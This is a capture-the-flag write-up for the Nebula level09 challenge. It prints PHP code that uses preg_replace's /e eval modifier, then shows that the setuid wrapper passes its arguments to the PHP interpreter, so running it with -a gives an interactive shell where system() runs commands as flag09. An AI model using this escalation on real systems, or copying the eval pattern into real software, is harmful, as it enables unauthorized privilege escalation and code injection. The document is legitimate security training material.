## Challenge
There’s a C setuid wrapper for some vulnerable PHP code.

## Solution
```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```
So, `flag09` is a `setuid` running `flag09.php`.
```console
level09@nebula:/home/flag09$ ls -l
total 8
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
level09@nebula:/home/flag09$ ./flag09
PHP Notice:  Undefined offset: 1 in /home/flag09/flag09.php on line 22
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/flag09/flag09.php on line 13
```
After doing some reading I realized the use of `/e` evaluates (as `PHP`) the replaced string.

During one of my tests trying to exploit this misuse I ran the following:
```console
level09@nebula:/home/flag09$ ./flag09 -h
Usage: php [options] [-f] <file> [--] [args...]
       php [options] -r <code> [--] [args...]
       php [options] [-B <begin_code>] -R <code> [-E <end_code>] [--] [args...]
       php [options] [-B <begin_code>] -F <file> [-E <end_code>] [--] [args...]
       php [options] -- [args...]
       php [options] -a

  -a               Run as interactive shell
  -c <path>|<file> Look for php.ini file in this directory
  -n               No php.ini file will be used
  -d foo[=bar]     Define INI entry foo with value 'bar'
  -e               Generate extended information for debugger/profiler
  -f <file>        Parse and execute <file>.
  -h               This help
  -i               PHP information
  -l               Syntax check only (lint)
  -m               Show compiled in modules
  -r <code>        Run PHP <code> without using script tags <?..?>
  -B <begin_code>  Run PHP <begin_code> before processing input lines
  -R <code>        Run PHP <code> for every input line
  -F <file>        Parse and execute <file> for every input line
  -E <end_code>    Run PHP <end_code> after processing all input lines
  -H               Hide any passed arguments from external tools.
  -s               Output HTML syntax highlighted source.
  -v               Version number
  -w               Output source with stripped comments and whitespace.
  -z <file>        Load Zend extension <file>.

  args...          Arguments passed to script. Use -- args when first argument
                   starts with - or script is read from stdin

  --ini            Show configuration file names

  --rf <name>      Show information about function <name>.
  --rc <name>      Show information about class <name>.
  --re <name>      Show information about extension <name>.
  --ri <name>      Show configuration for extension <name>.
```
Turns out the `setuid` file can be used to feed arguments to the `PHP` interpreter.

A very cool flag we can give it is `-a` which opens an interactive `PHP` shell.

I wonder if we can exploit it to run commands using `system` as `flag09`?
```console
level09@nebula:/home/flag09$ ./flag09 -a
Interactive shell

php > system('id');
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
php > system('getflag');
You have successfully executed getflag on a target account
```
